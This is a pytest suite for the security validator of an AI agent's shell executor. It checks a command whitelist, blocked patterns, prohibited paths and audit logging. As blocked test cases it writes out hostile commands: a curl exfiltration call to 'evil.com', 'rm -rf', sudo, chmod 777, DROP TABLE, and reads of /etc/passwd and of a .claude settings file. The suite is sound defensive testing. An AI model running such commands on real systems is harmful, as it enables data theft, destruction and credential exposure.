"""Tests for NEXUS executor — security policy enforcement.

Spec: spec_nexus_kernel_soul_v1.md §5
"""
from __future__ import annotations

import asyncio
import json
import os
import sys
from pathlib import Path

import pytest

_NEXUS = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_NEXUS / "kernel"))

import executor  # noqa: E402
from executor import Executor, ExecutorError, validate  # noqa: E402


# ── Whitelist tests ──────────────────────────────────────────────────────────

def test_allowed_simple_commands():
    for cmd in ["ls -la", "ps aux", "df -h", "free -m", "cat README.md"]:
        validate(cmd)


def test_unknown_command_blocked():
    with pytest.raises(ExecutorError, match="not in whitelist"):
        validate("whoami")


def test_git_readonly_allowed():
    for cmd in ["git status", "git log --oneline", "git diff HEAD~1", "git show HEAD"]:
        validate(cmd)


def test_git_write_ops_blocked():
    for cmd in ["git commit -m fix", "git push origin main", "git reset --hard"]:
        with pytest.raises(ExecutorError, match="Git op not allowed"):
            validate(cmd)


def test_python_only_pytest():
    validate("python3 -m pytest tests/")
    validate("python3 -m unittest discover")
    with pytest.raises(ExecutorError, match="python3 only allowed"):
        validate("python3 evil.py")


def test_curl_localhost_only():
    validate("curl http://localhost:8765/api/health")
    validate("curl http://127.0.0.1:8766/health")
    with pytest.raises(ExecutorError, match="curl only allowed to localhost"):
        validate("curl https://evil.com/exfil")


# ── Blocked patterns ─────────────────────────────────────────────────────────

def test_rm_rf_blocked():
    with pytest.raises(ExecutorError, match="Blocked pattern"):
        validate("rm -rf /tmp/foo")


def test_sudo_blocked():
    with pytest.raises(ExecutorError, match="Blocked pattern"):
        validate("sudo ls /root")


def test_chmod_777_blocked():
    with pytest.raises(ExecutorError, match="Blocked pattern"):
        validate("chmod 777 /tmp/foo")


def test_drop_table_blocked():
    with pytest.raises(ExecutorError, match="Blocked pattern"):
        validate("psql -c 'DROP TABLE memories'")


# ── Prohibited paths ─────────────────────────────────────────────────────────

def test_etc_blocked():
    with pytest.raises(ExecutorError, match="Prohibited path"):
        validate("cat /etc/passwd")


def test_other_agents_blocked():
    with pytest.raises(ExecutorError, match="Prohibited path"):
        validate("ls /home/dadito/IA/proyecto-seal/agents/ADA")


def test_claude_dir_blocked():
    with pytest.raises(ExecutorError, match="Prohibited path"):
        validate("cat /home/dadito/.claude/settings.json")


# ── Audit log ────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_propose_writes_audit(tmp_path, monkeypatch):
    audit_path = tmp_path / "audit.jsonl"
    monkeypatch.setattr(executor, "AUDIT_LOG", audit_path)
    monkeypatch.setattr(executor, "_post_webchat", _mock_post)
    monkeypatch.setenv("NEXUS_EXECUTE_MODE", "propose")

    ex = Executor()
    result = await ex.handle("ls -la")
    assert "NEXUS propone" in result and "ls -la" in result
    assert audit_path.exists()
    entry = json.loads(audit_path.read_text().strip().split("\n")[-1])
    assert entry["mode"] == "propose"
    assert entry["proposed"] is True


@pytest.mark.asyncio
async def test_blocked_command_logged(tmp_path, monkeypatch):
    audit_path = tmp_path / "audit.jsonl"
    monkeypatch.setattr(executor, "AUDIT_LOG", audit_path)
    monkeypatch.setenv("NEXUS_EXECUTE_MODE", "execute")

    ex = Executor()
    result = await ex.handle("rm -rf /tmp/danger")
    assert result.startswith("[BLOCKED]")
    entry = json.loads(audit_path.read_text().strip().split("\n")[-1])
    assert entry["blocked"] is True
    assert entry["success"] is False


@pytest.mark.asyncio
async def test_execute_mode_runs_command(tmp_path, monkeypatch):
    audit_path = tmp_path / "audit.jsonl"
    monkeypatch.setattr(executor, "AUDIT_LOG", audit_path)
    monkeypatch.setenv("NEXUS_EXECUTE_MODE", "execute")

    ex = Executor()
    result = await ex.handle("ls /tmp")
    assert result.startswith("[OK]") or result.startswith("[FAIL]")
    entry = json.loads(audit_path.read_text().strip().split("\n")[-1])
    assert entry["mode"] == "execute"
    assert "duration_ms" in entry


# ── Mock helper ──────────────────────────────────────────────────────────────

async def _mock_post(message: str) -> None:
    return None
